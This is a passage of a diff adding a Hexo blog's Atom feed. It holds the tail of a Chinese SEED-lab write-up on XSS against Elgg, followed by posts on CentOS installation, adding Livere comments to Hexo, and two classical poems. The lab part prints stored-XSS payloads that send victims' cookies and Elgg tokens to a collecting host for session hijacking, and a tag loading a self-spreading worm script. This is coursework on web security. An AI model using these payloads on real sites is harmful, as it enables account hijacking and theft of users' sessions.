rel="noopener">www.example.com</a></em> 分配端口号127.0.0.1       </p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/8.png" alt="img"></p><ul><li>配置Apache server，/etc/apache2/site-available/default中添加如下代码</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/9.png" alt="img"></p><ul><li>在/www目录下添加Example目录并在此目录下添加如下文件</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/10.png" alt="img"></p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/11.png" alt="img"></p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/12.png" alt="img"></p><p>其中，myscript.js中的代码为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'You are attacked by XSS! This is only a test.'</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>访问Elgg，以samy身份登入并修改samy的profile，在Location中添加如下代码</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/13.png" alt="img"></p><ul><li>访问Elgg,以alice身份登入并访问samy的profile</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/14.png" alt="img"></p><h2 id="2-3分析"><a href="#2-3分析" class="headerlink" title="2.3分析"></a>2.3分析</h2><p>上述操作检测到网站存在xss漏洞，显示提示框只是小小的恶作剧。在JavaScript中可以用函数来获取cookie，以获得攻击者所关心的信息。</p><h1 id="三、窃取cookie"><a href="#三、窃取cookie" class="headerlink" title="三、窃取cookie"></a>三、窃取cookie</h1><p>  攻击者：alice</p><h2 id="3-1显示cookie"><a href="#3-1显示cookie" class="headerlink" title="3. 1显示cookie"></a>3. 1显示cookie</h2><p> 通过注入恶意代码来实现显示受害者的Cookies</p><ul><li>访问Elgg以alice身份登入，并修改Alice的profile，  添加如下代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/15.png" alt="img"><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/16.png" alt="img"></p><center>显示alice的cookie</center><ul><li>访问Elgg并以boby身份登入，并访问alice的profile</li></ul><p>此时boby被诱导去访问alice的主页，因此他的cookie被网页解析并显示。</p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/17.png" alt="img"></p><center>显示boby的cookie</center><h2 id="3-2窃取cookie"><a href="#3-2窃取cookie" class="headerlink" title="3.2窃取cookie"></a>3.2窃取cookie</h2><p> 攻击者：alice（受害者：boby，samy……）</p><p> 我们需要在不登陆的情况下，获取其他用户的Cookie，以便可以使用cookie直接登录别人的账号。而要窃取别人的cookie，首先应具备一个能接收cookie的环境，然后通过javascript代码把别人的cookie通过http请求发送到所搭建的环境。</p><ul><li>登陆alice，在profiles中注入脚本</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;img src=http://www.xsslabelgg.com/hack.php?c='</span></span><br><span class="line"></span><br><span class="line">    +<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie) + <span class="string">'&gt;'</span>);</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/18.png" alt="img"></p><ul><li>创建一个hack.php的文件      <img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/19.png" alt="img"></li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/20.png" alt="img"></p><ul><li>创建一个cookie.txt以储存cookie</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/21.png" alt="img"></p><ul><li>窃取的cookie</li></ul><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/22.png" alt="img"></p><h2 id="3-3会话劫持"><a href="#3-3会话劫持" class="headerlink" title="3.3会话劫持"></a>3.3会话劫持</h2><p>使用窃取的Cookie进行会话劫持:当某个user访问A的profile时，攻击者就会获取此user的cookie、<strong>elgg_ts、</strong>elgg_token，然后在本地利用窃取的内容发起会话，将B等加为该user的好友。</p><p><u>攻击者：alice</u></p><ul><li>alice登入Elgg，并在个人profiles中注入下列脚本</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'img scr=http://127.0.0.1:5555?c='</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)+<span class="string">'&amp;'</span></span><br><span class="line"></span><br><span class="line">+elgg.security.token._elgg_ts+<span class="string">'&amp;'</span>+elgg.security.token._elgg_token+<span class="string">'&gt;'</span>);</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/24.png" alt=""></p><ul><li>samy登录Ellg，添加Charlie为好友</li></ul><p>这一步主要是为了查看受害者samy添加好友时候的请求。启动监听程序，samy访问alice的主页，此时监听程序获取到cookie、<strong>elgg_ts、</strong>elgg_token的值。</p><p>同时使用live http headers工具查看Elgg中添加好友时的HTTP请求头的各部分内容。</p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/25.png" alt="img"></p><ul><li>编写java代码，发送伪造的添加好友的HTTP请求</li></ul><p>劫持添加好友的会话：利用上一步骤得到的cookie、<strong>elgg_ts、</strong>elgg_token的值进行会话劫持，即将另一个人加为samy的好友。</p><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/26.png" alt="img"></p><p>Java源代码见于xss_SessionHijacking.java文件（源代码文件夹中）</p><ul><li>编译并运行java文件</li></ul><p>打开终端，使用 javac xss_SessionHijacking.java编译文件，使用java xss_SessionHijacking运行程序。</p><p><img src="file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image055.png" alt="img"></p><p><img src="file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image057.png" alt="img"></p><p><img src="file:///C:/Users/水煮鱼~1/AppData/Local/Temp/msohtmlclip1/01/clip_image059.png" alt="img"></p><h1 id="四、注入蠕虫"><a href="#四、注入蠕虫" class="headerlink" title="四、注入蠕虫"></a>四、注入蠕虫</h1><p>  其中蠕虫代码使用循环体以达到自动传播的目的，worm.js代码见于worm1.js和worm0.js（源代码文件夹中）。使用2.2节介绍的注入脚本的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">'text/javascript'</span> src=<span class="string">'http://www.xsslabelgg.com/xss_worm.js'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://1024-1253939655.cos.ap-beijing.myqcloud.com/image/27.png" alt="img"></p><p><br><br><br><br></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]      邱永华. (2013). XSS跨站脚本攻击剖析与防御. 人民邮电出版社.</p><p>[2]      嵩天老师. (2018). L12-黑客攻防和入侵检测技术.</p><p>[3]      嵩天老师. (2018). L1-网络信息安全概述(概念篇).</p><p>[4]      嵩天老师. (2018). L7-缓冲区溢出与渗透测试.</p><p>[5]      Syracuse_SEED_labs. (2018-5). SEEDVM_VirtualBoxManual. </p><p>[6]      Syracuse_SEED_labs. (2018-5). Ubuntu16_04_VM_Manual.</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;一、环境说明&quot;&gt;&lt;a href=&quot;#一、环境说明&quot; class=&quot;headerlink&quot; title=&quot;一、环境说明&quot;&gt;&lt;/a&gt;一、环境说明&lt;/h1&gt;&lt;p&gt;虚拟环境：SEEDUbuntu16.04+VirtualBox&lt;/p&gt;
+&lt;p&gt;攻击网站：XSS Site&lt;/
+      
+    
+    </summary>
+    
+      <category term="网络信息安全课程" scheme="https://yousite.com/categories/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B/"/>
+    
+    
+      <category term="计算机实验" scheme="https://yousite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安装centos操作系统</title>
+    <link href="https://yousite.com/2018/07/14/%E5%AE%89%E8%A3%85centos%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    <id>https://yousite.com/2018/07/14/安装centos操作系统/</id>
+    <published>2018-07-14T07:06:12.000Z</published>
+    <updated>2018-07-14T07:16:53.876Z</updated>
+    
+    <content type="html"><![CDATA[<p>1、安装包下载<a href="https://www.centos.org/" target="_blank" rel="noopener">传送门</a></p><p>2、安装教程，参考<a href="http://www.cnblogs.com/zhuwenjoyce/p/6393329.html" target="_blank" rel="noopener">传送门</a></p><p>3、安装增强功能（共享粘贴板、共享文件夹、屏幕自动调整<a href="http://www.it165.net/os/html/201504/12443.html" target="_blank" rel="noopener">传送门</a></p><p>4、如果3步骤后无法实现全屏，参考<a href="http://ju.outofmemory.cn/entry/179596" target="_blank" rel="noopener">传送门</a></p><p>5、如果4步骤中出错，请检查centos系统是否可以联网。</p><ul><li><p>联网问题：</p></li><li><p>[ ] <a href="http://ju.outofmemory.cn/entry/179596" target="_blank" rel="noopener">传送门1</a></p></li><li><p>[ ] <a href="https://cloud.tencent.com/developer/article/1023198" target="_blank" rel="noopener">传送门2</a></p></li><li><p>没有可用软件包 kmod-fglrx问题：阅读官网教程导入软件包。</p></li><li><p>[ ] <a href="https://elrepo.org/tiki/tiki-index.php" target="_blank" rel="noopener">传送门</a></p></li></ul><p><strong>附：教程中偶有出入，请对照自己系统比较分析*</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1、安装包下载&lt;a href=&quot;https://www.centos.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2、安装教程，参考&lt;a href=&quot;http://www.cnblogs.com/zhuwenjoy
+      
+    
+    </summary>
+    
+      <category term="操作系统" scheme="https://yousite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="centos" scheme="https://yousite.com/tags/centos/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[post]hexo主题添加评论功能</title>
+    <link href="https://yousite.com/2018/05/01/hexo%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/"/>
+    <id>https://yousite.com/2018/05/01/hexo主题添加评论功能/</id>
+    <published>2018-05-01T04:54:05.000Z</published>
+    <updated>2018-07-28T13:16:58.780Z</updated>
+    
+    <content type="html"><![CDATA[<p>前言：本文简要介绍livere评论系统的的添加，如您想要添加其他评论系统，请拉至文末，阅读相关博文（或者查阅更多资料）</p><a id="more"></a><h1 id="一、注册评论系统"><a href="#一、注册评论系统" class="headerlink" title="一、注册评论系统"></a>一、注册评论系统</h1><p>动手前请阅读网友博客：<a href="https://blog.csdn.net/ganzhilin520/article/details/79048010" target="_blank" rel="noopener">传送门</a></p><h1 id="二、修改相关文件"><a href="#二、修改相关文件" class="headerlink" title="二、修改相关文件"></a>二、修改相关文件</h1><p>1、修改配置文件 D:\hexo\themes\indigoCard\_config.yml，添加如下代码：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#来必力评论系统</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>2、修改脚本文件 D:\hexo\themes\indigoCard\layout_partial\post\comment.ejs，添加如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- partial(&apos;../plugins/livere&apos;) %&gt;</span><br></pre></td></tr></table></figure><p>3、添加脚本文件 D:\hexo\themes\indigoCard\layout_partial\plugins\livere.ejs，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- livere BEGIN --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"MTAyMC8zNjE0Mi8xMjY3Nw=="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">   (function(d, s) &#123;</span></span><br><span class="line"><span class="undefined">       var j, e = d.getElementsByTagName(s)[0];</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">       if (typeof LivereTower === 'function') &#123; return; &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">       j = d.createElement(s);</span></span><br><span class="line"><span class="undefined">       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';</span></span><br><span class="line"><span class="undefined">       j.async = true;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">       e.parentNode.insertBefore(j, e);</span></span><br><span class="line"><span class="undefined">   &#125;)(document, 'script');</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span> 为正常使用来必力评论功能请激活JavaScript<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- livere END --&gt;</span></span><br></pre></td></tr></table></figure><p>简单而言，其中代码来自于官方网站。</p><h1 id="三、重新部署"><a href="#三、重新部署" class="headerlink" title="三、重新部署"></a>三、重新部署</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><h1 id="四、其他相关博文"><a href="#四、其他相关博文" class="headerlink" title="四、其他相关博文"></a>四、其他相关博文</h1><p>添加Valine评论系统  <a href="https://www.xxwhite.com/2017/Valine.html" target="_blank" rel="noopener">传送门</a></p><p>其他评论系统介绍 <a href="https://blog.csdn.net/xiangzhihong8/article/details/77703791" target="_blank" rel="noopener">传送门</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;前言：本文简要介绍livere评论系统的的添加，如您想要添加其他评论系统，请拉至文末，阅读相关博文（或者查阅更多资料）&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="建站笔记" scheme="https://yousite.com/categories/%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[post]中文测试一</title>
+    <link href="https://yousite.com/2018/04/30/%E4%B8%AD%E6%96%87%E6%B5%8B%E8%AF%95%E4%B8%80/"/>
+    <id>https://yousite.com/2018/04/30/中文测试一/</id>
+    <published>2018-04-30T14:25:52.000Z</published>
+    <updated>2018-07-18T13:53:53.100Z</updated>
+    
+    <content type="html"><![CDATA[<style>​    #post{    letter-spacing: 0.05em;    font-size: 100px;    font-family: STLiti;    padding: 5px 0;​    }#post .text{    letter-spacing: 0.05em;    font-size: 20px;    font-family: STLiti;    padding: 5px 0;    color:  }</style><center id="post"><br><br>​    <div class="text"><br><br>#     题都城南庄<br><br>​    崔护<br><br>​    去年今日此门中，人面桃花相映红。<br><br>​    人面不知何处去，桃花依旧笑春风。<br><br>​    </div><br><br></center>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;style&gt;
+
+​    #post{
+
+    letter-spacing: 0.05em;
+    font-size: 100px;
+    font-family: STLiti;
+    padding: 5px 0;
+​    }
+
+#post .text{
+
+ 
+      
+    
+    </summary>
+    
+      <category term="唐诗选抄" scheme="https://yousite.com/categories/%E5%94%90%E8%AF%97%E9%80%89%E6%8A%84/"/>
+    
+    
+      <category term="崔护诗选" scheme="https://yousite.com/tags/%E5%B4%94%E6%8A%A4%E8%AF%97%E9%80%89/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[post]中文测试二</title>
+    <link href="https://yousite.com/2018/04/30/%E4%B8%AD%E6%96%87%E6%B5%8B%E8%AF%95%E4%BA%8C/"/>
+    <id>https://yousite.com/2018/04/30/中文测试二/</id>
+    <published>2018-04-30T14:25:52.000Z</published>
+    <updated>2018-07-18T13:54:38.588Z</updated>
+    
+    <content type="html"><![CDATA[<style>​    #post{    letter-spacing: 0.05em;    font-size: 100px;    font-family: STLiti;    padding: 5px 0;​    }#post .text{    letter-spacing: 0.05em;    font-size: 20px;    font-family: STLiti;    padding: 5px 0;    color:  }</style><center id="post"><br><br>​    <div class="text"><br><br>#     木兰花<br><br>​    纳兰性德<br><br>​    人生若只如初见，何事秋风悲画扇。<br><br>​    等闲变却故人心，却道古人心易变。<br><br>​    骊山语罢清宵半，泪雨霖铃终不怨。<br><br>​    何如薄幸锦衣郎，比翼连枝当日愿。<br><br>​    </div><br><br></center>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;style&gt;
+
+​    #post{
+
+    letter-spacing: 0.05em;
+    font-size: 100px;
+    font-family: STLiti;
+    padding: 5px 0;
+​    }
+
+#post .text{
+
+ 
+      
+    
+    </summary>
+    
+      <category term="宋词选抄" scheme="https://yousite.com/categories/%E5%AE%8B%E8%AF%8D%E9%80%89%E6%8A%84/"/>
+    
+    
+      <category term="纳兰性德" scheme="https://yousite.com/tags/%E7%BA%B3%E5%85%B0%E6%80%A7%E5%BE%B7/"/>
+    
+  </entry>
+  
+</feed>
